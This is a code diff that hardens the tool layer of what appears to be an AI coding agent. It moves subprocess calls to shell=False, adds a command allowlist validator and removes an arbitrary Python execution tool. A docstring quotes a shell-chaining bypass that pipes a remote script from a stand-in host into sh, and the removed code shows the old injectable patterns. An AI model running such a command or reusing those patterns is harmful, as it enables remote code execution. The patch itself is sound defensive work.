@@ -1,20 +1,22 @@
 import os
+import shutil
 import subprocess
 import urllib.parse
 import urllib.request
 import re
 from typing import Dict, Any, List
 
+from backend.core.security import validate_terminal_command
+
 class MCPTools:
     def __init__(self, workspace_dir: str):
         self.workspace_dir = os.path.abspath(workspace_dir)
 
     def _resolve_path(self, path: str) -> str:
-        """Helper to ensure paths stay within the workspace for safety."""
-        resolved = os.path.abspath(os.path.join(self.workspace_dir, path))
-        if not resolved.startswith(self.workspace_dir):
-            raise PermissionError("Access outside workspace is restricted.")
-        return resolved
+        """Ensure paths stay within the workspace (realpath + containment,
+        defeating traversal, symlink escapes and sibling-prefix confusion)."""
+        from backend.core.security import resolve_within
+        return resolve_within(self.workspace_dir, path)
 
     # 1. Filesystem Tools
     def filesystem_list(self, relative_path: str = ".") -> str:
@@ -52,15 +54,21 @@ class MCPTools:
         except Exception as e:
             return f"Error reading file: {e}"
 
-    # 2. Git Tools
+    # 2. Git Tools (argv form, shell=False — no operator chaining possible)
     def git_log(self, limit: int = 5) -> str:
         try:
+            limit = int(limit)
+        except (TypeError, ValueError):
+            limit = 5
+        limit = max(1, min(limit, 50))
+        try:
             res = subprocess.run(
-                ["git", "log", f"-n {limit}", "--oneline"],
+                ["git", "log", f"-n{limit}", "--oneline"],
                 cwd=self.workspace_dir,
                 capture_output=True,
                 text=True,
-                shell=True
+                shell=False,
+                timeout=15,
             )
             return res.stdout if res.returncode == 0 else f"Git log error: {res.stderr}"
         except Exception as e:
@@ -68,40 +76,54 @@ class MCPTools:
 
     def git_diff(self, file_path: str = "") -> str:
         try:
-            args = ["git", "diff"]
+            args = ["git", "diff", "--"]
             if file_path:
-                args.append(self._resolve_path(file_path))
+                resolved = self._resolve_path(file_path)
+                rel = os.path.relpath(resolved, self.workspace_dir)
+                args.append(rel)
             res = subprocess.run(
                 args,
                 cwd=self.workspace_dir,
                 capture_output=True,
                 text=True,
-                shell=True
+                shell=False,
+                timeout=15,
             )
             return res.stdout if res.returncode == 0 else f"Git diff error: {res.stderr}"
+        except PermissionError as e:
+            return f"Security Error: {e}"
         except Exception as e:
             return f"Error executing git diff: {e}"
 
-    # 3. Terminal Executions
+    # 3. Terminal Executions — strict argv allowlist, shell=False.
     def terminal_run(self, command: str) -> str:
         """
-        Runs specific allowed terminal commands (like pytest or npm build).
+        Runs only allowlisted, parameter-safe commands (pytest / npm builds).
+        The previous prefix check was bypassable by shell chaining
+        (``pytest && curl evil.sh | sh``); commands are now parsed into argv,
+        validated against the allowlist, and executed with shell=False so no
+        shell ever interprets operators.
         """
-        # Security: restrict commands
-        allowed_prefixes = ["pytest", "npm run build", "python -m pytest", "npm test"]
-        is_allowed = any(command.strip().startswith(pref) for pref in allowed_prefixes)
-        
-        if not is_allowed:
-            return f"Security Error: Command '{command}' is not in the whitelist of execution commands (pytest, npm run build)."
-            
+        argv, error = validate_terminal_command(command)
+        if error:
+            return f"Security Error: {error}"
+
+        # Resolve npm/npx to platform-specific batch shims on Windows without
+        # re-enabling the shell.
+        if argv[0] in ("npm", "npx") and os.name == "nt":
+            resolved = shutil.which(argv[0])
+            if not resolved:
+                return f"Security Error: '{argv[0]}' executable not found on PATH."
+            argv[0] = resolved
+
         try:
             res = subprocess.run(
-                command,
+                argv,
                 cwd=self.workspace_dir,
                 capture_output=True,
                 text=True,
-                shell=True,
-                timeout=30 # 30s timeout
+                shell=False,
+                timeout=30,
             )
             stdout = res.stdout or ""
             stderr = res.stderr or ""
@@ -111,35 +133,9 @@ class MCPTools:
         except Exception as e:
             return f"Error running terminal command: {e}"
 
-    # 4. Python Sandbox Execution
-    def python_execute(self, code: str) -> str:
-        try:
-            # Writes to a temp script and runs it in a subprocess
-            temp_file = os.path.join(self.workspace_dir, "db", "_temp_exec.py")
-            os.makedirs(os.path.dirname(temp_file), exist_ok=True)
-            
-            with open(temp_file, "w", encoding="utf-8") as f:
-                f.write(code)
-                
-            res = subprocess.run(
-                ["python", temp_file],
-                cwd=self.workspace_dir,
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            
-            # Clean up temp file
-            if os.path.exists(temp_file):
-                os.remove(temp_file)
-                
-            stdout = res.stdout or ""
-            stderr = res.stderr or ""
-            return f"Exit Code: {res.returncode}\nStdout:\n{stdout}\nStderr:\n{stderr}"
-        except subprocess.TimeoutExpired:
-            return "Python execution timed out after 10 seconds."
-        except Exception as e:
-            return f"Error running Python code: {e}"
+    # NOTE: python_execute (arbitrary code-in-temp-file tool) was removed in the
+    # P0 hardening pass — it granted unconditional remote code execution to any
+    # model output or prompt injection reaching the tool selector.
 
     # 5. Browser Tool (Mock Search / API Docs Fetcher)
     def browser_search(self, query: str) -> str:
@@ -190,7 +186,10 @@ class MCPTools:
         elif tool_name == "terminal_run":
             return self.terminal_run(args.get("command"))
         elif tool_name == "python_execute":
-            return self.python_execute(args.get("code"))
+            return (
+                "Security Error: python_execute was permanently removed in the P0 hardening pass "
+                "(arbitrary code execution). Use 'terminal_run' with an allowlisted command instead."
+            )
         elif tool_name == "browser_search":
             return self.browser_search(args.get("query"))
         else:
